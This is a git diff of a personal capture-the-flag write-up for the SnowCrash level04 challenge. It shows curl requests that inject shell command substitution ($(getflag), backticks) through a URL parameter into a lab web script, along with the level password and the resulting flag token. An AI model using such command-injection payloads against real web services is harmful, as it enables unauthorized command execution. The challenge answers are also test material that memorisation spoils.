@@ -1,4 +1,4 @@
-ssh level04@10.12.100.98 -p 4242
+ssh level04@ip -p 4242
 pwd: qi0maab88jeaj46qoumi7maus
 
 ```
@@ -17,14 +17,50 @@ Content-type: text/html
 
 ```
 
-curl: To change the request method, we can use the -X flag.
- sent any parameters to the server: ?param=
+quick google on how Sending Parameters via [cURL](http://conqueringthecommandline.com/book/curl#uid105)
+?param=
 
-http://10.12.100.98:4747/?x=`getflag`
+```
+level04@SnowCrash:~$ curl localhost:4747?x=$(ls)
+level04@SnowCrash:~$ curl localhost:4747?x=$(pwd)
+```
+then why not pass a getflag command
+
+```
+level04@SnowCrash:~$ curl localhost:4747?x=$(getflag)
+Check
+curl: (6) Couldn't resolve host 'flag.Here'
+curl: (6) Couldn't resolve host 'is'
+curl: (6) Couldn't resolve host 'your'
+curl: (6) Couldn't resolve host 'token'
+curl: (6) Couldn't resolve host ''
+curl: (6) Couldn't resolve host 'Nope'
+curl: (6) Couldn't resolve host 'there'
+curl: (6) Couldn't resolve host 'is'
+curl: (6) Couldn't resolve host 'no'
+curl: (6) Couldn't resolve host 'token'
+curl: (6) Couldn't resolve host 'here'
+curl: (6) Couldn't resolve host 'for'
+curl: (6) Couldn't resolve host 'you'
+curl: (6) Couldn't resolve host 'sorry.'
+curl: (6) Couldn't resolve host 'Try'
+curl: (6) Couldn't resolve host 'again'
+```
+
+a quick googling on how to skip Special characters in cURL
+https://stackoverflow.com/questions/10060093/special-characters-like-and-in-curl-post-data
 
 
-curl localhost:4747?x=\`getflag\`
+You can use \ sign 
+or single quotes
+`curl localhost:4747?x='$(getflag)'`
+
+other alternative of command substitution is using the ``
+```
 curl localhost:4747?x='`getflag`'
-curl localhost:4747?x='$(getflag)'
+curl localhost:4747?x=\`getflag\`
+```
+or in the browser
+http://10.12.100.98:4747/?x=`getflag`
 
 token : ne2searoevaevoem4ov4ar8ap
